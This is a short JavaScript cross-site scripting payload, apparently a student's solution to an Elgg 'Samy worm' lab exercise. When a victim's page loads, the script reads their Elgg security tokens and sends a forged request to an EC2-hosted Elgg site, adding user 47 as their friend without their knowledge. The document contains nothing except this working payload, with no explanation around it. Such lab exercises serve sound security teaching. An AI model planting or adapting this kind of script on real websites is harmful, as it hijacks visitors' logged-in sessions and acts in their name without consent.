<script type="text/javascript">
	window.onload = function () {
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the HTTP request to add Samy as a friend.
		var sendurl="http://ec2-54-90-220-11.compute-1.amazonaws.com/action/friends/add?friend=47"+ts+token; //FILL IN
		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","http://ec2-54-90-220-11.compute-1.amazonaws.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
</script>